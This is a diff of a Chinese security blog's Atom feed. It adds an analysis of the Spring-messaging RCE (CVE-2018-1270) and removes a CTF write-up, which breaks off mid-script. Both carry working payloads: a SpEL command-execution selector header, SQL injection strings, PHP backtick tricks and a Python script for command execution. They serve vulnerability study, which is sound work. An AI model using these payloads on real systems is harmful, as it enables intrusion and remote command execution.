@@ -220,6 +220,66 @@
   </entry>
   
   <entry>
+    <title>spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</title>
+    <link href="http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/"/>
+    <id>http://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-分析-【CVE-2018-1270】/</id>
+    <published>2018-04-07T04:15:46.000Z</published>
+    <updated>2018-04-07T23:21:42.537Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2252" target="_blank" rel="external">spring-messaging Remote Code Execution 分析-【CVE-2018-1270】</a><br><a id="more"></a></p>
+<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://pivotal.io/security/cve-2018-1270" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1270</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/1.jpg?raw=true" alt=""></p>
+<p>漏洞影响版本:</p>
+<ol>
+<li>Spring Framework 5.0 to 5.0.4</li>
+<li>Spring Framework 4.3 to 4.3.14</li>
+<li>Older unsupported versions are also affected</li>
+</ol>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用官方示例 <a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">https://github.com/spring-guides/gs-messaging-stomp-websocket</a> ，git clone后checkout到未更新版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-guides/gs-messaging-stomp-websocket</div><div class="line"></div><div class="line">git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3</div></pre></td></tr></table></figure></p>
+<p>用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> SockJS(<span class="string">'/gs-guide-websocket'</span>);</div><div class="line">    stompClient = Stomp.over(socket);</div><div class="line">    stompClient.connect(&#123;&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">frame</span>) </span>&#123;</div><div class="line">        setConnected(<span class="literal">true</span>);</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'Connected: '</span> + frame);</div><div class="line">        stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">            showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">        &#125;,header);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>增加了一个header头部，其中指定了<code>selector</code>，其值即payload。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/2.gif?raw=true" alt=""></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>当在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> header  = &#123;<span class="string">"selector"</span>:<span class="string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span>&#125;;</div><div class="line">...</div><div class="line">stompClient.subscribe(<span class="string">'/topic/greetings'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">greeting</span>) </span>&#123;</div><div class="line">    showGreeting(<span class="built_in">JSON</span>.parse(greeting.body).content);</div><div class="line">&#125;,header);</div></pre></td></tr></table></figure></p>
+<p>其中<code>header</code>中指定了<code>selector</code>，根据 <a href="https://stomp.github.io/stomp-specification-1.0.html" target="_blank" rel="external">Stomp Protocol Specification, Version 1.0</a>，通过指定对应的selecttor，可以对订阅的信息进行过滤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.</div><div class="line"></div><div class="line">You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created.</div></pre></td></tr></table></figure></p>
+<p>在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java 第140行，对这个header参数进行了接受和处理：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addSubscriptionInternal</span><span class="params">(</span></span></div><div class="line">        String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123;</div><div class="line"></div><div class="line">    Expression expression = <span class="keyword">null</span>;</div><div class="line">    MessageHeaders headers = message.getHeaders();</div><div class="line">    String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers);</div><div class="line">    <span class="keyword">if</span> (selector != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            expression = <span class="keyword">this</span>.expressionParser.parseExpression(selector);</div><div class="line">            <span class="keyword">this</span>.selectorHeaderInUse = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">                logger.trace(<span class="string">"Subscription selector: ["</span> + selector + <span class="string">"]"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Throwable ex) &#123;</div><div class="line">            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</div><div class="line">                logger.debug(<span class="string">"Failed to parse selector: "</span> + selector, ex);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</div><div class="line">    <span class="keyword">this</span>.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/3.jpg?raw=true" alt=""></p>
+<p>如图所示，此次连接对应的sessionId为<code>mrzfa005</code>，subsId为<code>sub-0</code>。</p>
+<p>之后，在 <a href="http://localhost:8080/" target="_blank" rel="external">http://localhost:8080/</a> 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在 org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendMessageToSubscribers</span><span class="params">(@Nullable String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String,String&gt; subscriptions = <span class="keyword">this</span>.subscriptionRegistry.findSubscriptions(message);</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
+<p>其中message保存了此次连接/会话的相关信息：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/5.jpg?raw=true" alt=""></p>
+<p>跟入 <code>this.subscriptionRegistry.findSubscriptions</code> 至 org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111 行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptions</span><span class="params">(Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    ....</div><div class="line">    <span class="keyword">return</span> findSubscriptionsInternal(destination, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>message作为参数被传入 <code>findSubscriptionsInternal</code> ，在return处继续跟进至 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> MultiValueMap&lt;String, String&gt; <span class="title">findSubscriptionsInternal</span><span class="params">(String destination, Message&lt;?&gt; message)</span> </span>&#123;</div><div class="line">    MultiValueMap&lt;String, String&gt; result = <span class="keyword">this</span>.destinationCache.getSubscriptions(destination, message);</div><div class="line">    <span class="keyword">return</span> filterSubscriptions(result, message);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>其中result变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/6.jpg?raw=true" alt=""></p>
+<p>该变量即 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201行的filterSubscriptions方法的<code>allMatches</code>变量，跟进至两层for循环<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (String sessionId : allMatches.keySet()) &#123;</div><div class="line">    <span class="keyword">for</span> (String subId : allMatches.get(sessionId)) &#123;</div><div class="line">        SessionSubscriptionInfo info = <span class="keyword">this</span>.subscriptionRegistry.getSubscriptions(sessionId);</div><div class="line">        <span class="keyword">if</span> (info == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        Subscription sub = info.getSubscription(subId);</div><div class="line">        <span class="keyword">if</span> (sub == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>通过两次<code>getSubscriptions</code>操作，此时取出了先前的配置信息，sub变量值如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/7.jpg?raw=true" alt=""></p>
+<p>接下去第 207 行将selector表达式取出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Expression expression = sub.getSelectorExpression();</div></pre></td></tr></table></figure></p>
+<p>第217行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</div><div class="line">        result.add(sessionId, subId);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>通过调用了<code>expression.getValue(context, Boolean.class)</code>，触发payload，执行了spel表达式，远程命令执行成功。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180407/8.jpg?raw=true" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://github.com/spring-guides/gs-messaging-stomp-websocket" target="_blank" rel="external">spring-guides/gs-messaging-stomp-websocket</a></li>
+<li><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html#websocket-stomp" target="_blank" rel="external">spring-framework-reference: websocket-stomp</a></li>
+<li><a href="https://blog.csdn.net/pacosonswjtu/article/details/51914567" target="_blank" rel="external">springmvc(18)使用WebSocket 和 STOMP 实现消息功能</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2252&quot;&gt;spring-messaging Remote Code Execution 分析-【CVE-2018-1270】&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="javaphp" scheme="http://chybeta.github.io/tags/javaphp/"/>
+    
+      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
+    
+  </entry>
+  
+  <entry>
     <title>GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】</title>
     <link href="http://chybeta.github.io/2018/03/30/GitStack-2-3-10-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-5955%E3%80%91/"/>
     <id>http://chybeta.github.io/2018/03/30/GitStack-2-3-10-远程命令执行漏洞分析-【CVE-2018-5955】/</id>
@@ -925,9 +985,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
@@ -1548,103 +1608,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>LCTF-2017-他们有什么秘密呢-writeup</title>
-    <link href="http://chybeta.github.io/2017/11/19/LCTF-2017-%E4%BB%96%E4%BB%AC%E6%9C%89%E4%BB%80%E4%B9%88%E7%A7%98%E5%AF%86%E5%91%A2-writeup/"/>
-    <id>http://chybeta.github.io/2017/11/19/LCTF-2017-他们有什么秘密呢-writeup/</id>
-    <published>2017-11-19T12:54:01.000Z</published>
-    <updated>2017-11-22T14:51:30.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>补充关于第一阶段sql注入知识/背景，第二节阶段命令执行详细过程及其知识点</p>
-<p>LCTF-2017-他们有什么秘密呢-writeup<br><a id="more"></a></p>
-<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">一个简单到不能再简单的......</div><div class="line">http://182.254.246.93/</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/9.png?raw=true" alt=""></p>
-<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/10.png?raw=true" alt=""></p>
-<p>这是第一关。查看源代码后，有如下tips：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --&gt;</div></pre></td></tr></table></figure></p>
-<p>所以目标很明确。</p>
-<p>经过测试，过滤了information等关键字。而union，select等则没有过滤。</p>
-<p>参考<a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">mysql注入可报错时爆表名、字段名、库名</a></p>
-<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><p>文章中利用的是Polygon()函数，这个也被过滤了。我换了linestring()来报错注入。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://182.254.246.93/entrance.php</div><div class="line"></div><div class="line">POST: pro_id=1 and linestring(pro_id)</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/11.png?raw=true" alt=""></p>
-<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">数据库名：youcanneverfindme17</div><div class="line">表名：product_2017ctf</div><div class="line">部分字段名：pro_id</div></pre></td></tr></table></figure></p>
-<p>除了linestring和Polygon外，其他同样能用来报错获取得到当前表名和字段的还有：</p>
-<ol>
-<li>multiPolygon(id)</li>
-<li>multilinestring(id)</li>
-<li>GeometryCollection(id)</li>
-<li>MultiPoint(id)</li>
-</ol>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/18.png?raw=true" alt=""></p>
-<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>其实这一步，可以跳过。因为利用union搭配别名子查询，可以达到在不知道字段名的时候进行注入。</p>
-<p>为了完整性，这里试一下注出字段名。</p>
-<p>利用<a href="https://drive.google.com/file/d/0B0r_xEcaZ8-JYzk3NzA0NzItNTJlMS00YTUyLThkNTQtODVkYmU4ZjMzM2Rj/view" target="_blank" rel="external">orangetw大佬的提过的技巧</a></p>
-<p>基本的原理是子查询中不允许出现相同的表名，本地环境测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/19.png?raw=true" alt=""></p>
-<p>之后可以利用using来逐步爆出字段名：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/20.png?raw=true" alt=""></p>
-<p>举一反三：</p>
-<p>第一步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id)) as c);</div><div class="line">Duplicate column name &apos;pro_name&apos;</div></pre></td></tr></table></figure></p>
-<p>第二步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name)) as c);</div><div class="line">Duplicate column name &apos;owner&apos;</div></pre></td></tr></table></figure></p>
-<p>第三步：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST: pro_id=-999 union (select * from (select * from product_2017ctf as a join product_2017ctf as b using(pro_id,pro_name,owner)) as c);</div><div class="line">Duplicate column name &apos;d067a0fa9dc61a6e&apos;</div></pre></td></tr></table></figure></p>
-<p>得到如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">库：youcanneverfindme17</div><div class="line">表：product_2017ctf</div><div class="line">字段: pro_id  pro_name owner,d067a0fa9dc61a6e</div></pre></td></tr></table></figure></p>
-<h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><p>参考文章： <a href="http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/" target="_blank" rel="external">http://blog.7ell.me/2017/05/30/2017-DDCTF-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%BF%87%E6%BB%A4%E5%88%97%E5%90%8Dget%E6%95%B0%E6%8D%AE/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST:pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from product_2017ctf)e limit 1 offset 3 )),NULL,NULL--</div><div class="line"></div><div class="line">product name:7195ca99696b5a896.php</div></pre></td></tr></table></figure>
-<p>最终获得完整的结构与数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">product_id:  1,2,3</div><div class="line">product_name: car,iphone11,nextentrance</div><div class="line">owner:Tom John Boss</div><div class="line">d067a0fa9dc61a6e:wobuzaizheli nextnext 7195ca99696b5a896.php</div></pre></td></tr></table></figure></p>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在做的过程，有想利用innodb引擎来注入，不过好像没啥用2333<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">pro_id=-2513 UNION ALL SELECT NULL,CONCAT((select table_name from innodb_table_stats)),NULL,NULL--</div><div class="line"></div><div class="line">&apos;youcanneverfindme17.innodb_table_stats&apos; doesn&apos;t exist</div><div class="line">数据库：youcanneverfindme17</div></pre></td></tr></table></figure></p>
-<p>根据tips，得到下一个入口地址:d067a0fa9dc61a6e7195ca99696b5a896.php<br><!-- Tip:将表的某一个字段名，和表中某一个表值进行字符串连接，就可以得到下一个入口喽~ --></p>
-<h2 id="PHP的命令执行"><a href="#PHP的命令执行" class="headerlink" title="PHP的命令执行"></a>PHP的命令执行</h2><p><a href="http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php" target="_blank" rel="external">http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php</a></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/12.png?raw=true" alt=""></p>
-<p>到了这里就跟 <a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web/tinyhosting-250" target="_blank" rel="external">32c3 2015 ctf-TinyHosting</a>的题目很像了。</p>
-<p>就几个知识点展开说一说。</p>
-<p>一个是<a href="http://php.net/manual/zh/language.basic-syntax.phptags.php" target="_blank" rel="external">php的短标签</a>。当php.ini的<code>short_open_tag=on</code>时，PHP支持短标签，默认情况下为off。当开启后能执行<code>&lt;? ?&gt;</code>标签内的php语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? echo &quot;chybeta\n&quot;;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
-<p>另一个知识点是<a href="http://php.net/manual/zh/language.operators.execution.php" target="_blank" rel="external">php的反引号命令执行</a>，php会反引号内的内容作为shell命令执行，效果与 shell_exec()同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;? $temp = `date`; echo $temp;?&gt;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">Wed Nov 22 22:01:34 CST 2017</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
-<p>第三个知识点是关于<a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="external">php的echo</a>，echo有个快捷写法，可以在打开标记前直接用一个等号。见下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$ vim test.php</div><div class="line">chybeta@ubuntu:/var/www/html$ cat test.php</div><div class="line">&lt;?=&quot;chybeta\n&quot;;</div><div class="line">chybeta@ubuntu:/var/www/html$ curl 127.0.0.1/test.php</div><div class="line">chybeta</div><div class="line">chybeta@ubuntu:/var/www/html$</div></pre></td></tr></table></figure></p>
-<p>我们的需求：执行命令，得到回显。结合上面三个知识点，在7个字节的限制下，比如构造如下（）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`w`;</div></pre></td></tr></table></figure></p>
-<p>（题外话：命令<code>w</code>用于显示已经登陆系统的用户列表）</p>
-<p>运行结果：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171118/21.png?raw=true" alt=""></p>
-<p>不过怎么执行任意命令呢？这里用到第四个知识点，shell中的通配符<code>*</code>会将符合模式的文件列出来，之后执行，详情可见这里<a href="http://man.chinaunix.net/linux/mandrake/101/zh_cn/Command-Line.html/glob-regex.html" target="_blank" rel="external">Shell 通配符</a>。所以当文件夹下有如下文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash z.sh</div></pre></td></tr></table></figure></p>
-<p>而我在shell中直接键入一个<code>*</code>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: *</div></pre></td></tr></table></figure></p>
-<p>shell会匹配并进行替换，完成替换后实际执行的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu: bash c.sh</div></pre></td></tr></table></figure></p>
-<p>由于这属于shell后台自动完成就不展示了。</p>
-<p>接着要考虑一点，我们需要用<code>*</code>来利用文件名执行任意命令，因此在文件名的构造顺序上需要注意。比如我们最终要在文件下生成这三个文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash c.sh z.php</div></pre></td></tr></table></figure></p>
-<p>才能成功的执行c.sh。</p>
-<p>附上利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">url = <span class="string">"http://182.254.246.93/d067a0fa9dc61a6e7195ca99696b5a896.php"</span></div><div class="line">user_agent = <span class="string">"xxx"</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">	command = raw_input(<span class="string">"input command: "</span>)</div><div class="line">	t = requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"z.php"</span>, <span class="string">"content"</span>:<span class="string">"&lt;?=`*`;"</span>&#125;).text</div><div class="line">	[path] = re.findall(<span class="string">'files.*/zzz.php'</span>, t)</div><div class="line"></div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"bash"</span>, <span class="string">"content"</span>:<span class="string">'anything'</span>&#125;)</div><div class="line">	requests.post(url, headers = &#123;<span class="string">'User-agent'</span>: user_agent &#125;, data = &#123;<span class="string">"filename"</span>:<span class="string">"c.sh"</span>, <span class="string">"content"</span>: command&#125;)</div><div class="line">	url1 = <span class="string">"http://182.254.246.93/"</span></div><div class="line">	r = 